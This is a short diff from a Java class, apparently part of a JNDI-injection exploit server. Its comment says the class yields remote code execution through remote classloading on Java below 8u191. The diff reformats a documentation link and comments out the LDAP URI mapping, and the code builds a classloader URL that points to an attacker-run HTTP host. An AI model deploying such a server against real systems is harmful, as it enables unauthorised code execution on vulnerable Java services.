@@ -15,14 +15,14 @@ import com.unboundid.ldap.sdk.ResultCode;
  * Yields:
  *  RCE via remote classloading.
  *
- * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
+ * @see <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">for details</a>
  *
  * Requires:
  * - java <8u191
  *
  * @author artsploit
  */
-@LdapMapping(uri = { "/", "/o=reference" })
+//@LdapMapping(uri = { "/", "/o=referenceExploit" })
 public class RemoteReference implements LdapController {
 
     private String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/";
